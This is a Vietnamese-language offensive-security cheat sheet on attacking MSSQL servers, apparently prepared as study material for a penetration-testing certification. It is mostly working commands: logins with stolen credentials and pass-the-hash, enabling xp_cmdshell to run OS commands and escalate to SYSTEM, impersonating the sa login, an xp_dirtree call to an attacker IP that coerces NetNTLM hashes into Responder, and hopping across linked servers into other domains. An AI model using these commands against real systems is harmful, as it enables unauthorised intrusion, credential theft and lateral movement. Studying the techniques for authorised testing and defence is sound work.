# 11 — MSSQL

**Trạng thái:** phát hiện MSSQL (port 1433) và có creds domain/SQL. **Mục tiêu:**
chạy lệnh OS (→ thường SeImpersonate → SYSTEM), mạo danh, hoặc nhảy qua linked
server tới máy/domain khác. Nhánh "MSSQL" của mindmap.

---

## A. Tìm & kết nối

```bash
nxc mssql <ip> -u <user> -p <password> -d <domain>            # kiểm tra truy cập
nxc mssql <ip_range> -u <user> -p <password>
mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>  # domain auth
mssqlclient.py <domain>/<user>:<password>@<ip>                # SQL auth
mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip> -hashes :<hash>   # PtH
```

```cypher
MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p           # ai là SQL admin (BloodHound)
```

- **Kết quả:** shell SQL (`SQL>`). Box mindmap "Users or Computers with SQL admin".

---

## B. Liệt kê trong mssqlclient

```sql
enum_db                       -- liệt kê database
enum_impersonate              -- ai có thể EXECUTE AS (impersonate)
enum_links                    -- linked server
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1 = sysadmin
```

---

## C. Thực thi lệnh OS (xp_cmdshell)

> **Khi nào:** là sysadmin (hoặc impersonate được sysadmin).
> **Tại sao:** chạy lệnh dưới tài khoản dịch vụ SQL → thường có SeImpersonate →
> Potato → SYSTEM.

```sql
enable_xp_cmdshell
xp_cmdshell <cmd>
xp_cmdshell whoami
```

- **Kết quả:** box **"Low Access"** (tài khoản SQL service) → [file 04](04-low-access-privesc.md) (Potato → SYSTEM).

---

## D. Impersonate (EXECUTE AS)

> **Khi nào:** `enum_impersonate` cho thấy có thể mạo danh login/user khác.

```sql
exec_as_user <user>           -- mạo danh database user
exec_as_login <login>         -- mạo danh server login (ví dụ sa)
```

- **Kết quả:** nâng quyền trong SQL → bật xp_cmdshell nếu thành sysadmin.

---

## E. Coerce qua MSSQL (lấy NetNTLM của SQL service)

> **Khi nào:** không phải sysadmin nhưng muốn hash tài khoản chạy SQL.
> **Tại sao:** ép SQL kết nối UNC về Responder → NetNTLM → crack/relay.

```sql
xp_dirtree \\<attacker_ip>\share       -- (mindmap: xp_dir_tree <ip>)
```

```bash
# chạy Responder/ntlmrelayx trước (file 01/14)
```

- **Kết quả:** box **"COERCE SMB"** → NetNTLM của `sql_svc` → crack hoặc relay.

---

## F. Linked servers (trustlink)

> **Khi nào:** `enum_links` thấy linked server; MSSQL trusted link **không quan
> tâm trust AD** → nhảy sang SQL server khác (kể cả domain khác).

```sql
enum_links
sp_linkedservers
use_link [SQL02]                       -- chuyển ngữ cảnh sang linked server
EXEC ('xp_cmdshell ''whoami''') AT [SQL02];
```

```powershell
# Crawl toàn bộ chuỗi linked server (box mindmap)
Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>
```

- **Kết quả:** box **"trustlink"** → thực thi trên SQL server liên kết → mở rộng
  sang máy/domain khác → [file 13](13-trusts.md).

---

## G. Enum bằng Metasploit (⚠️ thi)

```
msf> use auxiliary/admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/scanner/http/... (tùy)
```

---

## Checklist MSSQL

- [ ] `nxc mssql` / `mssqlclient.py -windows-auth`
- [ ] `enum_db / enum_impersonate / enum_links`
- [ ] sysadmin? → `enable_xp_cmdshell` → xp_cmdshell → Potato → SYSTEM
- [ ] Không sysadmin → `xp_dirtree` coerce → NetNTLM → crack/relay
- [ ] impersonate (exec_as_login sa)
- [ ] linked server (Get-SQLServerLinkCrawl) → nhảy máy khác
